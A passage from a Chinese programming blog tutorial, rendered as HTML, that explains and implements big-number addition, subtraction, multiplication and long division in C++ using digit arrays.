</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">clear</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(a);</span><br><span class="line">    <span class="built_in">print</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h3><p>四则运算中难度也各不相同。最简单的是高精度加减法，其次是高精度—单精度（普通的 <code>int</code>）乘法和高精度—高精度乘法，最后是高精度—高精度除法。</p><p>我们将按这个顺序分别实现所有要求的功能。</p><h4 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h4><p>高精度加法，其实就是竖式加法啦。</p><p><img src="/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/plus.png"></p><p>也就是从最低位开始，将两个加数对应位置上的数码相加，并判断是否达到或超过 $10$。如果达到，那么处理进位：将更高一位的结果上增加 $1$，当前位的结果减少 $10$。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 高精度实现中，一般令数组的最大长度 LEN 比可能的输入大一些</span></span><br><span class="line">  <span class="comment">// 然后略去末尾的几次循环，这样一来可以省去不少边界情况的处理</span></span><br><span class="line">  <span class="comment">// 因为实际输入不会超过 1000 位，故在此循环到 LEN - 1 = 1003 已经足够</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">// 将相应位上的数码相加</span></span><br><span class="line">    c[i] += a[i] + b[i];</span><br><span class="line">    <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">      <span class="comment">// 进位</span></span><br><span class="line">      c[i + <span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">      c[i] -= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试着和上一部分结合，可以得到一个加法计算器。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> LEN = <span class="number">1004</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[LEN], b[LEN], c[LEN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">clear</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        c[i] += a[i] + b[i];</span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">            c[i] -= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(a);</span><br><span class="line">    <span class="built_in">read</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">add</span>(a, b, c);</span><br><span class="line">    <span class="built_in">print</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="减法"><a href="#减法" class="headerlink" title="减法"></a>减法</h4><p>高精度减法，也就是竖式减法啦。</p><p><img src="/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/subtraction.png"></p><p>从个位起逐位相减，遇到负的情况则向上一位借 $1$。整体思路与加法完全一致。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">// 逐位相减</span></span><br><span class="line">    c[i] += a[i] - b[i];</span><br><span class="line">    <span class="keyword">if</span> (c[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// 借位</span></span><br><span class="line">      c[i + <span class="number">1</span>] -= <span class="number">1</span>;</span><br><span class="line">      c[i] += <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上一个程序中的 <code>add()</code> 替换成 <code>sub()</code>，就有了一个减法计算器。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> LEN = <span class="number">1004</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[LEN], b[LEN], c[LEN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">clear</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        c[i] += a[i] - b[i];</span><br><span class="line">        <span class="keyword">if</span> (c[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] -= <span class="number">1</span>;</span><br><span class="line">            c[i] += <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(a);</span><br><span class="line">    <span class="built_in">read</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sub</span>(a, b, c);</span><br><span class="line">    <span class="built_in">print</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>试一试，输入 <code>1 2</code>——输出 <code>/9999999</code>，诶这个怎么给了我一份假的代码啊……</p><p>事实上，上面的代码只能处理减数 $a$ 大于等于被减数 $b$ 的情况。处理被减数比减数小，即 $a&lt;b$ 时的情况很简单。</p><p>$a-b=-(b-a)$</p><p>要计算 $b-a$ 的值，因为有 $b&gt;a$，可以调用以上代码中的 <code>sub</code> 函数，写法为 <code>sub(b,a,c)</code>。要得到 $a-b$ 的值，在得数前加上负号即可。</p><h4 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h4><h5 id="高精度—单精度"><a href="#高精度—单精度" class="headerlink" title="高精度—单精度"></a>高精度—单精度</h5><p>高精度乘法，也就是竖……等会儿等会儿！</p><p>先考虑一个简单的情况：乘数中的一个是普通的 <code>int</code> 类型。有没有简单的处理方法呢？</p><p>一个直观的思路是直接将 $a$ 每一位上的数字乘以 $b$。从数值上来说，这个方法是正确的，但它并不符合十进制表示法，因此需要将它重新整理成正常的样子。</p><p>重整的方式，也是从个位开始逐位向上处理进位。但是这里的进位可能非常大，甚至远大于 $9$，因为每一位被乘上之后都可能达到 $9b$ 的数量级。所以这里的进位不能再简单地进行 $-10$ 运算，而是要通过除以 $10$ 的商以及余数计算。详见代码注释，也可以参考下图展示的一个计算高精度数 $1337$ 乘以单精度数 $42$ 的过程。</p><p><img src="/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/multiplication-short.png"></p><p>当然，也是出于这个原因，这个方法需要特别关注乘数 $b$ 的范围。若它和 $10^9$（或相应整型的取值上界）属于同一数量级，那么需要慎用高精度—单精度乘法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul_short</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b, <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">// 直接把 a 的第 i 位数码乘以乘数，加入结果</span></span><br><span class="line">        c[i] += a[i] * b;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="comment">// 处理进位</span></span><br><span class="line">            <span class="comment">// c[i] / 10 即除法的商数成为进位的增量值</span></span><br><span class="line">            c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">            <span class="comment">// 而 c[i] % 10 即除法的余数成为在当前位留下的值</span></span><br><span class="line">            c[i] %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="高精度—高精度"><a href="#高精度—高精度" class="headerlink" title="高精度—高精度"></a>高精度—高精度</h5><p>如果两个乘数都是高精度，那么竖式乘法又可以大显身手了。</p><p>回想竖式乘法的每一步，实际上是计算了若干 $a \times b_i \times 10^i$ 的和。例如计算 $1337 \times 42$，计算的就是 $1337 \times 2 \times 10^0 + 1337 \times 4 \times 10^1$。</p><p>于是可以将 $b$ 分解为它的所有数码，其中每个数码都是单精度数，将它们分别与 $a$ 相乘，再向左移动到各自的位置上相加即得答案。当然，最后也需要用与上例相同的方式处理进位。</p><p><img src="/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/multiplication-long.png"></p><p>注意这个过程与竖式乘法不尽相同，我们的算法在每一步乘的过程中并不进位，而是将所有的结果保留在对应的位置上，到最后再统一处理进位，但这不会影响结果。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">// 这里直接计算结果中的从低到高第 i 位，且一并处理了进位</span></span><br><span class="line">        <span class="comment">// 第 i 次循环为 c[i] 加上了所有满足 p + q = i 的 a[p] 与 b[q] 的乘积之和</span></span><br><span class="line">        <span class="comment">// 这样做的效果和直接进行上图的运算最后求和是一样的，只是更加简短的一种实现方式</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; ++j) c[i] += a[j] * b[i - j];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">            c[i] %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h4><p>高精度除法，也就是竖～～～～竖式长除法啦！</p><p><img src="/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/division.png"></p><p>竖式长除法实际上可以看作一个逐次减法的过程。例如上图中商数十位的计算可以这样理解：将 $45$ 减去三次 $12$ 后变得小于 $12$，不能再减，故此位为 $3$。</p><p>为了减少冗余运算，我们提前得到被除数的长度 $l_a$ 与除数的长度 $l_b$，从下标 $l_a - l_b$ 开始，从高位到低位来计算商。这和手工计算时将第一次乘法的最高位与被除数最高位对齐的做法是一样的。</p><p>参考程序实现了一个函数 <code>greater_eq()</code> 用于判断被除数以下标 <code>last_dg</code> 为最低位，是否可以再减去除数而保持非负。此后对于商的每一位，不断调用 <code>greater_eq()</code>，并在成立的时候用高精度减法从余数中减去除数，也即模拟了竖式除法的过程。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 被除数 a 以下标 last_dg 为最低位，是否可以再减去除数 b 而保持非负</span></span><br><span class="line"><span class="comment">// len 是除数 b 的长度，避免反复计算</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">greater_eq</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> last_dg, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 有可能被除数剩余的部分比除数长，这个情况下最多多出 1 位，故如此判断即可</span></span><br><span class="line">    <span class="keyword">if</span> (a[last_dg + len] != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 从高位到低位，逐位比较</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[last_dg + i] &gt; b[i]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[last_dg + i] &lt; b[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 相等的情形下也是可行的</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">div</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[], <span class="keyword">int</span> d[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line">    <span class="built_in">clear</span>(d);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> la, lb;</span><br><span class="line">    <span class="keyword">for</span> (la = LEN - <span class="number">1</span>; la &gt; <span class="number">0</span>; --la)</span><br><span class="line">        <span class="keyword">if</span> (a[la - <span class="number">1</span>] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (lb = LEN - <span class="number">1</span>; lb &gt; <span class="number">0</span>; --lb)</span><br><span class="line">        <span class="keyword">if</span> (b[lb - <span class="number">1</span>] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (lb == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&gt; &lt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;  <span class="comment">// 除数不能为零</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// c 是商</span></span><br><span class="line">    <span class="comment">// d 是被除数的剩余部分，算法结束后自然成为余数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; la; ++i) d[i] = a[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = la - lb; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 计算商的第 i 位</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">greater_eq</span>(d, b, i, lb)) &#123;</span><br><span class="line">            <span class="comment">// 若可以减，则减</span></span><br><span class="line">            <span class="comment">// 这一段是一个高精度减法</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; lb; ++j) &#123;</span><br><span class="line">                d[i + j] -= b[j];</span><br><span class="line">                <span class="keyword">if</span> (d[i + j] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    d[i + j + <span class="number">1</span>] -= <span class="number">1</span>;</span><br><span class="line">                    d[i + j] += <span class="number">10</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 使商的这一位增加 1</span></span><br><span class="line">            c[i] += <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 返回循环开头，重新检查</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="入门篇完成！"><a href="#入门篇完成！" class="headerlink" title="入门篇完成！"></a>入门篇完成！</h2><p>将上面介绍的四则运算的实现结合，即可完成开头提到的计算器程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 